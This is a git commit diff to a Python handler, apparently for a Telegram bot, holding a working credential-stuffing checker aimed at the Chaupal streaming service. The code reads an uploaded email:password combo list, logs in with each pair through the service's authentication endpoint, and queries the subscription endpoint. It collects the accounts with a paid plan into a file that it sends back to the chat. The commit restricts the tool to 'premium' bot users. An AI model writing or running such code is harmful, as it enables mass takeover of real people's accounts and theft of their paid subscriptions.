4a7890fd325ac6e7364775956aa8521fa48e17fc
fxsihadds <137089580+fxsihadds@users.noreply.github.com>
2023-09-25 14:10:06 +0600

    Update chaupal.py

--- handlers/chaupal.py
+++ handlers/chaupal.py
@@ -9,87 +9,91 @@ AUTH_URL = f'https://identitytoolkit.googleapis.com/v1/accounts:signInWithPasswo
 SUBSCRIPTION_URL = 'https://content.chaupal.tv/payments/subscription'
 
 
-async def chaupal_helper_command(app: Client, message: Message):
-    status = await message.reply_text('<i>Checking Chaupal...</i>')
-    try:
-        if message.reply_to_message and message.reply_to_message.document:
-            document = await app.download_media(message.reply_to_message.document)
-            combos = []
-            with open(document, 'r') as file:
-                for line in file:
-                    combo = line.strip()
-                    combos.append(combo)
-            os.remove(document)
-        else:
-            await status.edit_text(text='Please reply with a valid combo.txt file.')
-            return
-
-        total_combos = len(combos)
-        checked_combos = 0
-        success_count = 0
-        error_count = 0
-        premium_accounts = []
-
-        with tqdm(combos, desc='Checking combos', unit='combo', ncols=80) as progress_bar:
-            for combo in progress_bar:
-                combo_split = combo.split(':')
-                if len(combo_split) != 2:
-                    continue
-
-                email = combo_split[0]
-                password = combo_split[1]
-
-                auth_data = {
-                    "returnSecureToken": True,
-                    "email": email,
-                    "password": password
-                }
-                auth_response = requests.post(AUTH_URL, json=auth_data)
-                auth_data = auth_response.json()
-
-                checked_combos += 1
-
-                if 'idToken' in auth_data:
-                    id_token = auth_data['idToken']
-
-                    headers = {'Authorization': f'Bearer {id_token}'}
-                    subscription_response = requests.get(SUBSCRIPTION_URL, headers=headers)
-
-                    if subscription_response.status_code == 200:
-                        subscription_data = subscription_response.json()
-
-                        if 'plan' in subscription_data:
-                            plan_name = subscription_data['planMetadata'].get('name')
-                            premium_accounts.append(f"{combo} [Plan Name: {plan_name}]")
-                            success_count += 1
-
-                    else:
-                        error_count += 1
-
-        if premium_accounts:
-            premium_text = '\n'.join(premium_accounts)
-            with open('Chaupal_premium.txt', 'w') as file:
-                file.write(premium_text)
-            await app.send_document(message.chat.id, 'Chaupal_premium.txt')
-            os.remove('Chaupal_premium.txt')
-
-        message_text = (
-            f'<b>Checked Combos:</b> {checked_combos}/{total_combos}\n'
-            f'<b>Success Count:</b> {success_count}\n'
-            f'<b>Error Count:</b> {error_count}'
-        )
-        await status.edit_text(text=message_text)
-
-    except requests.exceptions.RequestException as e:
-        print(f"An error occurred during the request: {e}")
-        await status.edit_text(text="An error occurred during the request. Please try again later.")
-
-    except KeyError:
-        print("Failed to parse the response JSON.")
-        await status.edit_text(text="Failed to parse the response JSON. Please try again later.")
-
-
 def register(app):
     @app.on_message(filters.command("chaupal"))
-    async def chaupal_command(_, message):
-        await chaupal_helper_command(app, message)
+    async def chaupal_helper_command(app: Client, message: Message):
+        with open(file="users/premium.txt", mode="r+", encoding="utf-8") as premium:
+            premium_users = premium.readlines()
+        if str(message.from_user.id)+'\n' in premium_users:
+            status = await message.reply_text('<i>Checking Chaupal...</i>')
+            try:
+                if message.reply_to_message and message.reply_to_message.document:
+                    document = await app.download_media(message.reply_to_message.document)
+                    combos = []
+                    with open(document, 'r') as file:
+                        for line in file:
+                            combo = line.strip()
+                            combos.append(combo)
+                    os.remove(document)
+                else:
+                    await status.edit_text(text='<b>Please reply with a valid combo.txt file😡.</b>')
+                    return
+
+                total_combos = len(combos)
+                checked_combos = 0
+                success_count = 0
+                error_count = 0
+                premium_accounts = []
+
+                with tqdm(combos, desc='Checking combos', unit='combo', ncols=80) as progress_bar:
+                    for combo in progress_bar:
+                        combo_split = combo.split(':')
+                        if len(combo_split) != 2:
+                            continue
+
+                        email = combo_split[0]
+                        password = combo_split[1]
+
+                        auth_data = {
+                            "returnSecureToken": True,
+                            "email": email,
+                            "password": password
+                        }
+                        auth_response = requests.post(AUTH_URL, json=auth_data)
+                        auth_data = auth_response.json()
+
+                        checked_combos += 1
+
+                        if 'idToken' in auth_data:
+                            id_token = auth_data['idToken']
+
+                            headers = {'Authorization': f'Bearer {id_token}'}
+                            subscription_response = requests.get(
+                                SUBSCRIPTION_URL, headers=headers)
+
+                            if subscription_response.status_code == 200:
+                                subscription_data = subscription_response.json()
+
+                                if 'plan' in subscription_data:
+                                    plan_name = subscription_data['planMetadata'].get(
+                                        'name')
+                                    premium_accounts.append(
+                                        f"{combo} [Plan Name: {plan_name}]")
+                                    success_count += 1
+
+                            else:
+                                error_count += 1
+
+                if premium_accounts:
+                    premium_text = '\n'.join(premium_accounts)
+                    with open('Chaupal_premium.txt', 'w') as file:
+                        file.write(premium_text)
+                    await app.send_document(message.chat.id, 'Chaupal_premium.txt')
+                    os.remove('Chaupal_premium.txt')
+
+                message_text = (
+                    f'<b>Checked Combos:</b> {checked_combos}/{total_combos}\n'
+                    f'<b>Success Count:</b> {success_count}\n'
+                    f'<b>Error Count:</b> {error_count}'
+                )
+                await status.edit_text(text=message_text)
+
+            except requests.exceptions.RequestException as e:
+                print(f"An error occurred during the request: {e}")
+                await status.edit_text(text="<b>An error occurred during the request. Please try again later.</b>")
+
+            except KeyError:
+                print("Failed to parse the response JSON.")
+                await status.edit_text(text="<b>Failed to parse the response JSON. Please try again later.</b>")
+        else:
+            await message.reply("<strong>Only For Premium Users😞</strong>")
